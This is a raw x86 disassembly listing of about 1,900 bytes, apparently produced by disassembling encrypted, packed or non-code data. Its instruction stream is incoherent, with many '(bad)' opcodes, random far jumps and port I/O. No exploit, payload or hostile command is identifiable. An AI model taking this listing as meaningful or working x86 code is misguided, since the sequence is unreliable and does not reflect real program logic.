  417e3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e3f:	aam    0xf9
  417e41:	sar    ebp,cl
  417e43:	add    BYTE PTR [ecx-0x8],ch
  417e46:	xchg   DWORD PTR [edx+0x2590dc48],eax
  417e4c:	call   0x82cf:0xf46c11ae
  417e53:	pop    ebx
  417e54:	in     eax,0x40
  417e56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e57:	popf   
  417e58:	int    0xe5
  417e5a:	aam    0x4b
  417e5c:	xor    eax,0x4b1fdd8f
  417e61:	xchg   edi,eax
  417e62:	mov    WORD PTR [esi-0x15fabbc],gs
  417e68:	add    DWORD PTR [edx-0xb33d084],ecx
  417e6e:	jmp    0x8790:0x9eae5863
  417e75:	or     bh,bl
  417e77:	sar    dh,cl
  417e79:	dec    esp
  417e7a:	pop    ds
  417e7b:	dec    ebp
  417e7c:	jmp    0xd2dc:0xb47d8fca
  417e83:	popf   
  417e84:	loop   0x417e40
  417e86:	das    
  417e87:	popf   
  417e88:	lods   eax,DWORD PTR ds:[esi]
  417e89:	jp     0x417ee5
  417e8b:	jno    0x417eb1
  417e8d:	mov    edi,0xae41d3f0
  417e92:	or     ebp,ecx
  417e94:	sbb    al,0xe9
  417e96:	sub    ch,BYTE PTR [esi]
  417e98:	sub    DWORD PTR [ebx],0x9c6cc797
  417e9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e9f:	icebp  
  417ea0:	cld    
  417ea1:	mov    eax,ds:0xdf87804c
  417ea6:	je     0x417eb6
  417ea8:	cmp    DWORD PTR [edx],0xffffff8f
  417eab:	cmp    BYTE PTR [ebp+0xea12a56],ah
  417eb1:	mov    ah,0x35
  417eb3:	test   eax,0x601f21ff
  417eb8:	mov    al,0x4a
  417eba:	retf   
  417ebb:	pop    eax
  417ebc:	aaa    
  417ebd:	loop   0x417eed
  417ebf:	test   al,0xe9
  417ec1:	loop   0x417f0f
  417ec3:	push   edx
  417ec4:	(bad)  
  417ec5:	test   al,0x14
  417ec7:	inc    edi
  417ec8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ec9:	add    DWORD PTR [eax],ebp
  417ecb:	clc    
  417ecc:	push   ds
  417ecd:	sbb    edi,ecx
  417ecf:	in     eax,dx
  417ed0:	(bad)  
  417ed1:	enter  0xa0b2,0x15
  417ed5:	out    dx,eax
  417ed6:	sti    
  417ed7:	xor    BYTE PTR [eax-0x1fd2e56e],ah
  417edd:	add    al,BYTE PTR [edx-0xfda112c]
  417ee3:	and    bl,BYTE PTR [ecx+ecx*4-0x36]
  417ee7:	mov    eax,ds:0xdd637092
  417eec:	not    DWORD PTR [ebp+0x7e40912c]
  417ef2:	loop   0x417f33
  417ef4:	iret   
  417ef5:	ror    DWORD PTR ds:0x7d7739f6,cl
  417efb:	xchg   ebx,eax
  417efc:	mov    ebx,0xfb331bb6
  417f01:	sub    al,0x9c
  417f03:	in     al,dx
  417f04:	jle    0x417f7a
  417f06:	pop    edx
  417f07:	push   eax
  417f08:	xchg   ebp,eax
  417f09:	arpl   WORD PTR [ecx],ax
  417f0b:	mov    gs,WORD PTR ds:0x229d477d
  417f11:	sbb    DWORD PTR [eax+0x45],0xf
  417f15:	pusha  
  417f16:	stos   BYTE PTR es:[edi],al
  417f17:	mov    edx,0x4e599b05
  417f1c:	sar    DWORD PTR [ebx+0x22],0xb7
  417f20:	add    DWORD PTR [ebp+esi*1-0x6c],0xf7bf799a
  417f28:	gs mov ah,0x57
  417f2b:	int3   
  417f2c:	cmp    al,0x32
  417f2e:	cmp    dl,dl
  417f30:	aam    0x2f
  417f32:	cmp    eax,0x3eed244b
  417f37:	scas   al,BYTE PTR es:[di]
  417f39:	mov    es,WORD PTR [edi+0x37]
  417f3c:	popf   
  417f3d:	imul   esp,DWORD PTR [ecx-0x6e],0x447e8dd4
  417f44:	inc    edi
  417f45:	mov    al,0x5d
  417f47:	fcomp  DWORD PTR [edx]
  417f49:	ins    BYTE PTR es:[edi],dx
  417f4a:	pop    ds
  417f4b:	mov    edx,0x34312ef9
  417f50:	rcl    DWORD PTR [ebp-0x24],0x5f
  417f54:	mov    edi,0x1022e93a
  417f59:	inc    edx
  417f5a:	daa    
  417f5b:	hlt    
  417f5c:	push   edx
  417f5d:	xor    DWORD PTR [ecx-0xb],esp
  417f60:	pop    edi
  417f61:	add    DWORD PTR [edx+0x74ff74d8],esi
  417f67:	jecxz  0x417f13
  417f69:	or     DWORD PTR [edx+0x42],eax
  417f6c:	and    DWORD PTR [eax],0x54
  417f6f:	leave  
  417f70:	dec    edx
  417f71:	mov    eax,0xb6863a48
  417f76:	(bad)  
  417f77:	or     DWORD PTR [eax+0x18],esp
  417f7a:	pushf  
  417f7b:	jge    0x417f74
  417f7d:	or     ecx,DWORD PTR [edi+0x73]
  417f80:	in     eax,dx
  417f81:	inc    edi
  417f82:	test   DWORD PTR [ebx+0x4046979b],esp
  417f88:	cmp    BYTE PTR cs:[edi+0x3683903],dl
  417f8f:	sti    
  417f90:	mov    esp,0x78ed0620
  417f95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f96:	push   es
  417f97:	fs inc ecx
  417f99:	into   
  417f9a:	dec    esi
  417f9b:	sbb    al,0x21
  417f9d:	ja     0x417faa
  417f9f:	push   ecx
  417fa0:	icebp  
  417fa1:	pop    esi
  417fa2:	fcmovb st,st(7)
  417fa4:	xor    ch,BYTE PTR [eax*2-0x7b714ff0]
  417fab:	push   ecx
  417fac:	test   al,0x5d
  417fae:	rcr    BYTE PTR [ebx],cl
  417fb0:	xchg   DWORD PTR [ebp+esi*8+0x26],ebp
  417fb4:	and    edi,DWORD PTR [ecx-0x24]
  417fb7:	stc    
  417fb8:	adc    edi,0xf1512db2
  417fbe:	retf   
  417fbf:	js     0x417f7e
  417fc1:	mov    ds:0x3b84e640,al
  417fc6:	push   eax
  417fc7:	(bad)  
  417fc8:	push   0x62
  417fca:	xchg   ebp,eax
  417fcb:	out    0xe8,al
  417fcd:	jmp    0x57ea:0xc2124435
  417fd4:	add    al,0x9a
  417fd6:	mov    edi,0x2ead72de
  417fdb:	scas   eax,DWORD PTR es:[edi]
  417fdc:	push   ebx
  417fdd:	sub    eax,0xe006db79
  417fe2:	dec    ebx
  417fe3:	pop    esi
  417fe4:	jmp    0x19ae:0x690d7f5b
  417feb:	xchg   esp,eax
  417fec:	dec    esp
  417fed:	ds push cs
  417fef:	mov    bh,0x45
  417ff1:	nop
  417ff2:	(bad)  
  417ff4:	xchg   esp,eax
  417ff5:	stos   DWORD PTR es:[edi],eax
  417ff6:	push   ebp
  417ff7:	fadd   DWORD PTR [eax]
  417ff9:	pop    es
  417ffa:	pop    esi
  417ffb:	idiv   DWORD PTR [edi]
  417ffd:	call   0x747482ce
  418002:	mov    ds:0x9901373a,al
  418007:	enter  0x2d90,0xce
  41800b:	rcl    ebp,0xdc
  41800e:	pop    esi
  41800f:	out    0x52,eax
  418011:	outs   dx,BYTE PTR ds:[esi]
  418012:	lods   eax,DWORD PTR ds:[esi]
  418013:	retf   0xffa4
  418016:	dec    esi
  418017:	pop    edi
  418018:	jne    0x418072
  41801a:	add    DWORD PTR [esi+0xe],0xfffffff9
  41801e:	add    DWORD PTR [ebx+0x5390f1a5],edx
  418024:	jno    0x418016
  418026:	aas    
  418027:	loopne 0x418049
  418029:	adc    ebx,DWORD PTR [edx]
  41802b:	rcr    DWORD PTR [eax],cl
  41802d:	sub    BYTE PTR [esp+ecx*1+0x56],bl
  418031:	sbb    dl,BYTE PTR [esi+0x5362d5d9]
  418037:	sar    DWORD PTR [eax],cl
  418039:	jecxz  0x417fca
  41803b:	cmp    DWORD PTR [ebp+0x3a],esi
  41803e:	or     eax,0x33220db0
  418043:	mov    ebp,0x86732d69
  418048:	ins    BYTE PTR es:[edi],dx
  418049:	int    0xef
  41804b:	add    esp,ecx
  41804d:	enter  0x9e6f,0xf
  418051:	xchg   esp,eax
  418052:	aaa    
  418053:	into   
  418054:	add    BYTE PTR [edi+0x2226e86c],ch
  41805a:	push   ebx
  41805b:	gs fndisi(8087 only) 
  41805e:	pushf  
  41805f:	popf   
  418060:	test   DWORD PTR [esi],ebx
  418062:	jmp    0xb85c3b0d
  418067:	mov    ah,0x2d
  418069:	stc    
  41806a:	jb     0x418058
  41806c:	sbb    eax,0xc645fb6a
  418071:	dec    ebx
  418072:	nop
  418073:	adc    ch,dh
  418075:	add    dh,BYTE PTR ss:[eax+0x4a0a4561]
  41807c:	push   eax
  41807d:	sbb    BYTE PTR [edi-0x1d],bh
  418080:	jl     0x41800b
  418082:	iret   
  418083:	in     al,dx
  418084:	or     al,0x8
  418086:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418087:	pushf  
  418088:	jl     0x418094
  41808a:	xchg   edx,eax
  41808b:	inc    ebp
  41808c:	ret    
  41808d:	js     0x41810d
  41808f:	jo     0x4180dd
  418091:	add    DWORD PTR [esi+0x5c7be731],eax
  418097:	icebp  
  418098:	mov    dl,0x3a
  41809a:	or     al,0xba
  41809c:	jmp    0x41803e
  41809e:	cli    
  41809f:	or     DWORD PTR [edx-0x152d5664],esp
  4180a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4180a6:	js     0x4180a6
  4180a8:	xor    cl,BYTE PTR [edx-0x66a6580c]
  4180ae:	aad    0xd8
  4180b0:	fisubr WORD PTR [eax+eax*4+0x8]
  4180b4:	dec    esi
  4180b5:	mov    esp,edi
  4180b7:	and    al,0x40
  4180b9:	xor    ebp,0xa8c756cb
  4180bf:	leave  
  4180c0:	xlat   BYTE PTR ds:[ebx]
  4180c1:	int3   
  4180c2:	aas    
  4180c3:	jmp    0x418121
  4180c5:	or     ch,BYTE PTR [esi+0x5d]
  4180c8:	mov    BYTE PTR [edx+0x55eaf969],ch
  4180ce:	outs   dx,DWORD PTR ds:[esi]
  4180cf:	jg     0x41812a
  4180d1:	sbb    BYTE PTR [edx],bl
  4180d3:	pusha  
  4180d4:	iret   
  4180d5:	aaa    
  4180d6:	mov    WORD PTR [ecx+0xd],cs
  4180d9:	cmp    esp,eax
  4180db:	pusha  
  4180dc:	inc    edi
  4180dd:	sbb    al,0x2e
  4180df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4180e0:	mov    cl,0xbb
  4180e2:	jb     0x4180b8
  4180e4:	mov    edx,0xde87c9c4
  4180e9:	sub    ecx,esp
  4180eb:	inc    edi
  4180ec:	adc    bl,dl
  4180ee:	xlat   BYTE PTR ds:[ebx]
  4180ef:	ffreep st(1)
  4180f1:	push   ebp
  4180f2:	test   DWORD PTR [eax+0x6b77a740],ecx
  4180f8:	mov    bh,0x18
  4180fa:	push   edx
  4180fb:	cmp    al,0xce
  4180fd:	scas   eax,DWORD PTR es:[edi]
  4180fe:	push   0x174484fb
  418103:	jle    0x418104
  418105:	in     al,dx
  418106:	(bad)  
  418107:	cld    
  418108:	fdivr  QWORD PTR [eax+edx*4-0x48]
  41810c:	sbb    esp,DWORD PTR [esi+0x1d]
  41810f:	retf   
  418110:	mov    al,BYTE PTR [ebx+0x64]
  418113:	(bad)  
  418114:	adc    bh,BYTE PTR [eax]
  418116:	jbe    0x41809e
  418118:	jns    0x4180a5
  41811a:	or     al,BYTE PTR [edx+0x22]
  41811d:	cmp    esi,ecx
  41811f:	addr16 mov al,ds:0x3e08
  418123:	pop    ebp
  418124:	out    dx,al
  418125:	cwde   
  418126:	out    dx,al
  418127:	in     eax,0xcd
  418129:	lea    esi,[edi]
  41812b:	pop    ebp
  41812c:	and    al,0xb
  41812e:	and    al,0xa7
  418130:	mov    ah,0xd3
  418132:	pop    esp
  418133:	or     al,0x84
  418135:	and    DWORD PTR [eax],ebp
  418137:	addr16 push ebx
  418139:	dec    ebx
  41813a:	je     0x41819d
  41813c:	add    DWORD PTR [ebp+0x7e],ecx
  41813f:	xor    esp,DWORD PTR [eax]
  418141:	mov    cl,0xed
  418143:	push   edi
  418144:	push   ecx
  418145:	call   0x3ebd560a
  41814a:	pop    esi
  41814b:	lahf   
  41814c:	and    DWORD PTR [eax-0x26],ecx
  41814f:	dec    esi
  418150:	xchg   edx,eax
  418151:	inc    esi
  418152:	mov    WORD PTR [eax-0x122fe60b],ss
  418158:	shr    DWORD PTR [edi],1
  41815a:	ror    DWORD PTR [ecx-0x1b],1
  41815d:	ret    
  41815e:	mov    cl,0x7
  418160:	push   esi
  418161:	xlat   BYTE PTR ds:[ebx]
  418162:	pushf  
  418163:	mov    ecx,0xc79a76b
  418168:	lock adc al,0x23
  41816b:	out    0x27,al
  41816d:	mov    al,0x26
  41816f:	push   ss
  418170:	cdq    
  418171:	pop    edx
  418172:	(bad)  
  418173:	mov    ds:0xa76d3f66,eax
  418178:	adc    ecx,edi
  41817a:	shr    DWORD PTR [edi-0x2da9fc15],1
  418180:	add    DWORD PTR [eax+0x9],0xffffffd0
  418184:	add    esi,DWORD PTR [ecx+0x42d76c61]
  41818a:	add    al,0xd7
  41818c:	fdiv   DWORD PTR [esi-0x3]
  41818f:	mov    esp,0x283e2286
  418194:	shl    DWORD PTR [esi],cl
  418196:	(bad)  
  418197:	push   ebp
  418198:	dec    eax
  418199:	adc    BYTE PTR [ecx],cl
  41819b:	dec    ebp
  41819c:	inc    esp
  41819d:	mov    bl,0x1
  41819f:	pop    edx
  4181a0:	fnstcw WORD PTR [ecx+0x329a779]
  4181a6:	inc    ebx
  4181a7:	lods   eax,DWORD PTR ds:[esi]
  4181a8:	mov    fs,WORD PTR [edi+0x7fb2b68a]
  4181ae:	xor    al,0x9a
  4181b0:	outs   dx,BYTE PTR ds:[esi]
  4181b1:	fs pop ss
  4181b3:	mov    ah,BYTE PTR [edi-0x7840303e]
  4181b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181bb:	loop   0x418174
  4181bd:	inc    ebx
  4181be:	jecxz  0x418161
  4181c0:	lock sub dl,BYTE PTR [edx-0x18a92b27]
  4181c7:	pop    ds
  4181c8:	pop    esp
  4181c9:	inc    esp
  4181ca:	retf   0x7d60
  4181cd:	js     0x4181c8
  4181cf:	out    0xdc,eax
  4181d1:	inc    ebp
  4181d2:	jns    0x418204
  4181d4:	arpl   WORD PTR [edx+0x1b],sp
  4181d7:	sbb    eax,0xf4983c2d
  4181dc:	and    BYTE PTR [edi+edx*2+0x31],bh
  4181e0:	(bad)  
  4181e1:	sar    DWORD PTR [esi],0x23
  4181e4:	push   0x60d3485e
  4181e9:	or     BYTE PTR [ebx-0x3e],cl
  4181ec:	jg     0x418196
  4181ee:	push   0x2e
  4181f0:	push   ds
  4181f1:	call   0xe0246929
  4181f6:	je     0x41822f
  4181f8:	pop    es
  4181f9:	dec    ebp
  4181fa:	inc    DWORD PTR [edi]
  4181fc:	and    al,0x81
  4181fe:	daa    
  4181ff:	push   eax
  418200:	pop    ebp
  418201:	add    al,0xd2
  418203:	aam    0x44
  418205:	sub    DWORD PTR [edi-0x267010e3],esp
  41820b:	add    DWORD PTR fs:[ebx+0x221779eb],0xffffffdc
  418213:	inc    ecx
  418214:	push   es
  418215:	push   esi
  418216:	lods   al,BYTE PTR ds:[esi]
  418217:	adc    dl,bh
  418219:	sbb    bh,BYTE PTR [edx-0xe69c120]
  41821f:	arpl   WORD PTR [ecx],di
  418221:	lahf   
  418222:	adc    al,0xb5
  418224:	cmp    al,0x7b
  418227:	in     eax,0xab
  418229:	test   DWORD PTR [ebp-0x592ae205],ebp
  41822f:	pop    eax
  418230:	(bad)  
  418231:	fldcw  WORD PTR [ebp-0x5a]
  418234:	aad    0x28
  418236:	mov    ah,0x15
  418238:	cmp    eax,0xeb7b33cb
  41823d:	push   ds
  41823e:	call   0x4fc48c9a
  418243:	(bad)
  418246:	bound  edx,QWORD PTR [ebx-0x52]
  418249:	fucompp 
  41824b:	jecxz  0x4181ee
  41824d:	(bad)  
  41824e:	cli    
  41824f:	mov    ebp,0xc55b04ec
  418254:	out    dx,eax
  418255:	jecxz  0x41824f
  418257:	je     0x418206
  418259:	fstp   TBYTE PTR [ebp+0x670fa946]
  41825f:	jno    0x418223
  418261:	mov    esi,0x506b4552
  418266:	and    ecx,DWORD PTR [ecx+ecx*8+0x2ba729de]
  41826d:	nop
  41826e:	popa   
  41826f:	add    BYTE PTR [ebx-0x504e61a8],bl
  418275:	pusha  
  418276:	mov    al,0x60
  418278:	add    cl,BYTE PTR [edx]
  41827a:	mov    esi,0x26a93cf9
  41827f:	sbb    eax,0xf9f5d353
  418284:	jp     0x418278
  418286:	adc    BYTE PTR [eax],bh
  418288:	(bad)  
  418289:	mov    edx,0xe1dc8982
  41828e:	outs   dx,DWORD PTR ds:[esi]
  41828f:	adc    BYTE PTR [ecx+edx*4-0x70fed26c],ch
  418296:	(bad)  
  418297:	ss mov ch,0x36
  41829a:	pop    esi
  41829b:	test   al,0x67
  41829d:	loopne 0x41828f
  41829f:	inc    edx
  4182a0:	push   esp
  4182a1:	retf   
  4182a2:	push   eax
  4182a3:	into   
  4182a4:	clc    
  4182a5:	mov    eax,ds:0xda761d42
  4182aa:	jns    0x418251
  4182ac:	rcl    BYTE PTR [esi-0x4289a65b],1
  4182b2:	int3   
  4182b3:	xlat   BYTE PTR ds:[ebx]
  4182b4:	pop    ebx
  4182b5:	(bad)
  4182ba:	dec    ecx
  4182bb:	in     eax,0xe8
  4182bd:	mov    esp,0x8d1f59aa
  4182c2:	js     0x4182f1
  4182c4:	jmp    0x418312
  4182c6:	push   cs
  4182c7:	lahf   
  4182c8:	retf   0xe8f7
  4182cb:	sub    BYTE PTR [ebp+0x2d],dh
  4182ce:	pusha  
  4182cf:	mov    bh,BYTE PTR [edi-0x35f2e83a]
  4182d5:	dec    ecx
  4182d6:	dec    ebx
  4182d7:	or     BYTE PTR [edi+0x199e642c],bh
  4182dd:	mov    ah,BYTE PTR [eax+ebp*4+0x3ff339fe]
  4182e4:	inc    eax
  4182e5:	(bad)  
  4182e7:	inc    ecx
  4182e8:	and    ebp,edi
  4182ea:	fwait
  4182eb:	adc    eax,ebp
  4182ed:	jmp    0x857f4f64
  4182f2:	xor    al,0x44
  4182f4:	repz pop ds
  4182f6:	push   esp
  4182f7:	mov    bh,0x44
  4182f9:	add    DWORD PTR [ebp+0x36c6016],esi
  4182ff:	cwde   
  418300:	pop    ecx
  418301:	pop    esp
  418302:	inc    esp
  418303:	fmul   QWORD PTR ds:0x1a0c82c3
  418309:	or     eax,0xffcd3132
  41830e:	xor    DWORD PTR [esi+0x29b62b8b],0xffffff95
  418315:	dec    ecx
  418316:	add    esi,DWORD PTR [edx+0x1f544895]
  41831c:	mov    BYTE PTR [edx-0x78],ch
  41831f:	and    BYTE PTR [eax+0x8],0x6e
  418323:	push   ss
  418324:	mov    ebp,0x673471f2
  418329:	jecxz  0x418343
  41832b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41832c:	pop    ecx
  41832d:	jp     0x4182c5
  41832f:	jecxz  0x4182c8
  418331:	lods   al,BYTE PTR ds:[esi]
  418332:	push   ss
  418333:	add    eax,0x2d401d78
  418338:	xchg   ecx,eax
  418339:	mov    al,ds:0x3fc9b486
  41833e:	add    BYTE PTR [ecx-0x76],cl
  418341:	int3   
  418342:	mov    ds:0x4eca5513,eax
  418347:	and    al,BYTE PTR [ebx]
  418349:	sub    dx,0xfffe
  41834d:	out    dx,al
  41834e:	push   0x89299375
  418353:	or     al,ah
  418355:	jl     0x418361
  418357:	dec    eax
  418358:	mov    edi,0xb868fb72
  41835d:	iret   
  41835e:	dec    esi
  41835f:	mov    esi,0x6983f51e
  418364:	xor    BYTE PTR [eax-0x3d],dl
  418367:	mov    edx,DWORD PTR [edi+0x6ac5f62d]
  41836d:	repz mov bl,0x1e
  418370:	in     eax,dx
  418371:	out    0xb0,eax
  418373:	mov    esp,eax
  418375:	(bad)  
  418376:	push   esi
  418377:	jmp    ebp
  418379:	mov    ecx,0x76578169
  41837e:	fcomp  DWORD PTR [ebp-0x6f6c5b9]
  418384:	fistp  WORD PTR [ebx]
  418386:	xchg   BYTE PTR [ebx-0x70],bl
  418389:	push   cs
  41838a:	add    dl,ch
  41838c:	jns    0x418393
  41838e:	test   DWORD PTR [eax+eiz*4],0x26d02035
  418395:	xor    al,0xee
  418397:	das    
  418398:	(bad)
  41839b:	push   ds
  41839c:	or     bl,BYTE PTR [edx-0x7d4551b4]
  4183a2:	fsubr  DWORD PTR [edx]
  4183a4:	adc    al,0xf1
  4183a6:	hlt    
  4183a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4183a8:	push   0x1d7c0ddb
  4183ad:	retf   
  4183ae:	div    DWORD PTR [ebx]
  4183b0:	adc    DWORD PTR [eax+0x1e],edi
  4183b3:	push   eax
  4183b4:	push   DWORD PTR [edx-0x1c632e35]
  4183ba:	es dec edx
  4183bc:	xchg   ebp,eax
  4183bd:	ss cmp eax,0x2ac65650
  4183c3:	add    al,0x1d
  4183c5:	jg     0x41839a
  4183c7:	mov    DWORD PTR [ecx+0x65],ebx
  4183ca:	push   edi
  4183cb:	push   edx
  4183cc:	loope  0x4183d0
  4183ce:	mov    ds:0xc2bbeca7,eax
  4183d3:	add    edx,ecx
  4183d5:	fisttp QWORD PTR [edi]
  4183d7:	aad    0x1d
  4183d9:	shl    BYTE PTR [ebp+0x70],0x6e
  4183dd:	lods   eax,DWORD PTR ds:[esi]
  4183de:	or     BYTE PTR [ebx],ah
  4183e0:	cs int3 
  4183e2:	das    
  4183e3:	out    0xe1,al
  4183e5:	into   
  4183e6:	out    dx,eax
  4183e7:	adc    cl,BYTE PTR [eax+0x7d]
  4183ea:	fbld   TBYTE PTR [eax+0x7431328a]
  4183f0:	add    al,0x45
  4183f2:	sbb    ebp,DWORD PTR [esi]
  4183f4:	pop    edx
  4183f5:	daa    
  4183f6:	adc    al,0x77
  4183f8:	inc    eax
  4183f9:	pusha  
  4183fa:	mov    DWORD PTR [edi],edx
  4183fc:	sub    ah,BYTE PTR [edi]
  4183fe:	mov    esp,0x4b50b393
  418403:	push   ebp
  418404:	sbb    eax,edi
  418406:	hlt    
  418407:	and    ah,ah
  418409:	and    al,0x33
  41840b:	mov    al,0x2f
  41840d:	dec    ebx
  41840e:	xor    DWORD PTR [edx],ebx
  418410:	sub    ebp,edi
  418412:	scas   al,BYTE PTR es:[edi]
  418413:	pop    ebp
  418414:	gs pusha 
  418416:	mov    ecx,0x439c03f5
  41841b:	sub    al,0x3e
  41841d:	(bad)  
  41841e:	fbld   TBYTE PTR [eax+ebx*4-0x417d65e1]
  418425:	std    
  418426:	xor    esi,ecx
  418428:	push   ss
  418429:	adc    al,0x52
  41842b:	push   esi
  41842c:	leave  
  41842d:	sbb    eax,0x8b628710
  418432:	pop    ebx
  418433:	xchg   ebp,eax
  418434:	jnp    0x4183d9
  418436:	sbb    BYTE PTR [esi-0x5720e8bf],ch
  41843c:	xor    esp,DWORD PTR [ebx+edi*1-0x43a3671d]
  418443:	push   eax
  418444:	mov    esi,0x83c9b1e2
  418449:	or     esp,DWORD PTR [edx-0x7624460e]
  41844f:	ror    esi,1
  418451:	mov    ah,0xbf
  418453:	inc    edi
  418454:	sub    DWORD PTR [eax],ebx
  418456:	imul   esi,DWORD PTR [edi-0x1c249aa1],0xd63504b0
  418460:	rol    BYTE PTR [edi-0x2a],0x5
  418464:	jl     0x418494
  418466:	fisttp QWORD PTR [edi]
  418468:	push   ds
  418469:	int    0x50
  41846b:	sub    BYTE PTR [ebx],0xca
  41846e:	or     DWORD PTR ds:0x8bd39591,ebp
  418474:	mov    edx,DWORD PTR [ebp-0x41ea47c9]
  41847a:	retf   
  41847b:	xor    ch,BYTE PTR [ebx]
  41847d:	outs   dx,BYTE PTR ds:[esi]
  41847e:	jae    0x4184b1
  418480:	add    ecx,ebp
  418482:	inc    esp
  418483:	fsubr  st,st(4)
  418485:	test   eax,0x205d33f6
  41848a:	clc    
  41848b:	ss sub eax,0xb995d191
  418491:	pop    edi
  418492:	enter  0xd451,0xcb
  418496:	rol    DWORD PTR [esi],cl
  418498:	mov    esp,0x9771dde1
  41849d:	cmp    ebp,DWORD PTR cs:[eax+esi*4+0x4e]
  4184a2:	fnstenv [eax]
  4184a4:	adc    BYTE PTR [ebx+0x131a0b35],al
  4184aa:	inc    edi
  4184ab:	imul   ebp,edx,0x4879e3c8
  4184b1:	adc    BYTE PTR [eax],dh
  4184b3:	sbb    esp,ebx
  4184b5:	and    al,0xb0
  4184b7:	xor    BYTE PTR [edx],bl
  4184b9:	test   al,0x92
  4184bb:	rcl    BYTE PTR [edi-0x1a],0xe3
  4184bf:	jmp    DWORD PTR ds:0x26602634
  4184c5:	clc    
  4184c6:	popa   
  4184c7:	mov    ds:0xf111a144,eax
  4184cc:	mul    DWORD PTR fs:[esi-0x24]
  4184d0:	dec    edx
  4184d1:	scas   al,BYTE PTR es:[edi]
  4184d2:	mov    ds:0xe754c5bc,eax
  4184d7:	pop    ebp
  4184d8:	add    BYTE PTR [edi-0xf],0x7
  4184dc:	pop    esi
  4184dd:	inc    ecx
  4184de:	cmp    al,0x1b
  4184e0:	addr16 pusha 
  4184e2:	ret    
  4184e3:	pop    eax
  4184e4:	and    DWORD PTR [edi+0x306f7591],edx
  4184ea:	retf   
  4184eb:	sbb    al,BYTE PTR [esi]
  4184ed:	js     0x418523
  4184ef:	(bad)  
  4184f1:	push   cs
  4184f2:	retf   
  4184f3:	pushf  
  4184f4:	lods   eax,DWORD PTR ds:[esi]
  4184f5:	icebp  
  4184f6:	mov    ecx,0x49801255
  4184fb:	cdq    
  4184fc:	lea    esp,es:[edi+0xd]
  418500:	les    ecx,FWORD PTR [ebp-0x22a65f15]
  418506:	out    dx,eax
  418507:	(bad)  
  418508:	adc    ebp,DWORD PTR [edx]
  41850a:	jns    0x418572
  41850c:	jne    0x41856f
  41850e:	mov    edi,0x8d29b4fb
  418513:	adc    esp,DWORD PTR [edi+0x6a]
  418516:	mov    bh,0xcc
  418518:	cmp    BYTE PTR [eax],bl
  41851a:	loopne 0x4184ab
  41851c:	aas    
  41851d:	push   edx
  41851e:	out    dx,eax
  41851f:	loop   0x418549
  418521:	clc    
  418522:	imul   esp,edx,0x2e5ab1f8
  418528:	mov    ds:0x66943684,al
  41852d:	(bad)  
  41852e:	outs   dx,BYTE PTR ds:[esi]
  41852f:	add    ecx,DWORD PTR [edx-0x807c717]
  418535:	sub    al,0x51
  418537:	fild   QWORD PTR [esi-0x2d6a15a1]
  41853d:	lahf   
  41853e:	jnp    0x418536
  418540:	jge    0x418514
  418542:	ins    BYTE PTR es:[edi],dx
  418543:	xor    dh,bl
  418545:	mov    BYTE PTR [ebp+0x2f],ah
  418548:	xchg   esp,eax
  418549:	adc    ch,BYTE PTR [esi*8+0x5a147bf7]
  418550:	inc    ecx
  418551:	and    DWORD PTR [eax+0x16695b71],edi
  418557:	adc    esi,DWORD PTR [eax+0x18717f5b]
  41855d:	and    ecx,DWORD PTR [ebp+ebx*4+0x65]
  418561:	aas    
  418562:	ret    0x169
  418565:	xchg   esp,eax
  418566:	sar    BYTE PTR [edx-0x5427f2cf],cl
  41856c:	ror    BYTE PTR [edx+0x74],cl
  41856f:	(bad)  
  418570:	jnp    0x418554
  418572:	sbb    bl,bl
  418574:	and    eax,0x1c176b36
  418579:	jns    0x418560
  41857b:	xchg   ebp,eax
  41857c:	cdq    
  41857d:	pop    esp
  41857e:	test   eax,0x45536cdd
  418583:	jle    0x41859d
  418585:	push   cs
  418586:	shr    DWORD PTR [ebx+edx*4-0x3f],1
  41858a:	dec    ebx
  41858b:	mov    edx,DWORD PTR [edx]
  41858d:	jne    0x4185fe
  41858f:	pop    ebp
  418590:	outs   dx,DWORD PTR ds:[esi]
  418591:	dec    esi
  418592:	out    0x97,eax
  418594:	push   cs
  418595:	das    
  418596:	or     bh,BYTE PTR [eax]
  418598:	loope  0x4185a5
  41859a:	into   
  41859b:	aam    0x63
  41859d:	or     eax,DWORD PTR [edi-0xfb55ba3]
  4185a3:	leave  
  4185a4:	aam    0x51
  4185a6:	jns    0x4185c0
  4185a8:	sub    ch,dl
  4185aa:	pop    ebp
  4185ab:	jecxz  0x4185d9
  4185ad:	test   BYTE PTR [edx+ecx*1],al
  4185b0:	and    al,0x35
  4185b2:	or     eax,0xea206f67
  4185b7:	sbb    al,0x20
  4185b9:	jp     0x418617
  4185bb:	in     al,0xc9
  4185bd:	add    ecx,DWORD PTR [edx-0x3f65a994]
  4185c3:	and    al,0x1a
  4185c5:	rcl    bl,cl
  4185c7:	in     al,dx
  4185c8:	ds adc esp,eax
  4185cb:	cli    
  4185cc:	shr    DWORD PTR [eax-0x26],0x10
  4185d0:	pop    esi
  4185d1:	outs   dx,BYTE PTR ds:[esi]
  4185d2:	dec    ebx
  4185d3:	or     BYTE PTR [edi+ebx*1],bh
  4185d6:	sti    
  4185d7:	xor    BYTE PTR [esi-0xf268a46],0x15
  4185de:	mov    ds:0x5ff62c09,eax
  4185e3:	add    al,BYTE PTR [ebx-0x5bc3fbfa]
  4185e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185ea:	xor    ecx,DWORD PTR [esi-0x182ed430]
  4185f0:	or     ah,BYTE PTR [ecx]
  4185f2:	dec    ebx
  4185f3:	mov    dl,0xe2
  4185f5:	sbb    DWORD PTR [esi+0x778f6e49],0xfffffff4
  4185fc:	mov    eax,ebp
  4185fe:	out    dx,al
  4185ff:	call   0x26f7:0x75a2a0ac
  418606:	inc    edx
  418607:	fmul   st,st(6)
  418609:	es stos BYTE PTR es:[edi],al
  41860b:	jmp    0x418668
